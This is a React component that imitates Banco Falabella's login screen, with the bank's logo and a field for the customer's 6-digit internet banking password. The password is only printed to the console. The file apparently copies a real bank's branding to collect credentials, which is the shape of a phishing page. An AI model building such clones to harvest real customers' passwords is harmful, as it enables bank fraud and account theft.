import React, { useState } from 'react';
import './BancoFalabellaTC.css';
import FalabellaLogo from '../img/Logotipo_Banco_Falabella.svg.png';

const BancoFalabellaTCPassword = () => {
    const [password, setPassword] = useState('');

    // Se activa cuando tiene exactamente 6 dígitos (como dice el placeholder "6 dígitos")
    // u opcionalmente cuando tenga cierta longitud, aquí lo validamos para 6.
    const isFormValid = password.length === 6;

    const handleInputChange = (e) => {
        // Solo permite números y máximo 6
        const value = e.target.value.replace(/\D/g, '').slice(0, 6);
        setPassword(value);
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (isFormValid) {
            console.log('Validando clave:', password);
        }
    };

    return (
        <div className="falabella-tc-layout">
            <div className="tc-container">
                {/* LOGO CENTRAL */}
                <div className="tc-logo-container">
                    <img src={FalabellaLogo} alt="Banco Falabella" className="tc-logo" />
                </div>

                {/* FORMULARIO MOBILE PARA CLAVE */}
                <form className="tc-form" onSubmit={handleSubmit}>
                    
                    {/* INPUT DE CLAVE (PUNTOS) */}
                    <div className="tc-form-group">
                        <input
                            type="password"
                            name="password"
                            value={password}
                            onChange={handleInputChange}
                            placeholder="Clave Internet de 6 dígitos"
                            className="tc-input"
                            maxLength="6"
                            inputMode="numeric"
                            autoComplete="off"
                        />
                    </div>

                    {/* BOTÓN ENTRAR */}
                    <button 
                        type="submit" 
                        className="tc-btn-continue"
                        disabled={!isFormValid}
                    >
                        Entrar
                    </button>

                    {/* LINKS INFERIORES */}
                    <div className="tc-recovery-link-container">
                        <a href="#" className="tc-recovery-link tc-recovery-link-margin" target="_blank" rel="noopener noreferrer">
                            Recupera o crea tu Clave Internet
                        </a>
                        <br />
                        <br />
                        <a href="#" className="tc-recovery-link" target="_blank" rel="noopener noreferrer">
                            Cambiar de usuario
                        </a>
                    </div>

                </form>
            </div>
        </div>
    );
};

export default BancoFalabellaTCPassword;
